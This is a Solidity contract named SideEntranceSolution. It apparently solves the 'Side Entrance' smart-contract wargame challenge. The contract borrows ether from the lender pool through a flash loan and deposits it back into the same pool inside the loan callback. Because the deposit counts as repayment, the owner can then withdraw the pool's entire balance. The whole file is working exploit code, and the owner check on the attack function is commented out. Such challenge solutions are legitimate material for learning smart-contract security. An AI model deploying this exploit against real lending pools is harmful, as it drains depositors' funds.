// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceSolution is IFlashLoanEtherReceiver{
    SideEntranceLenderPool public pool;
    address payable owner;

    constructor(address sideEntranceLenderPoolAddress,address payable _owner) {
        pool = SideEntranceLenderPool(sideEntranceLenderPoolAddress);
        owner = _owner;
    }

    function execute() override external payable {
        pool.deposit{value: msg.value}();
    }

    receive () external payable {
    }

    function withdraw() external {
        require(msg.sender == owner);
        pool.withdraw();
        owner.transfer(address(this).balance);
    }

    function attack(uint256 amount) external {
        // require(msg.sender == owner);
        pool.flashLoan(amount);
    }
}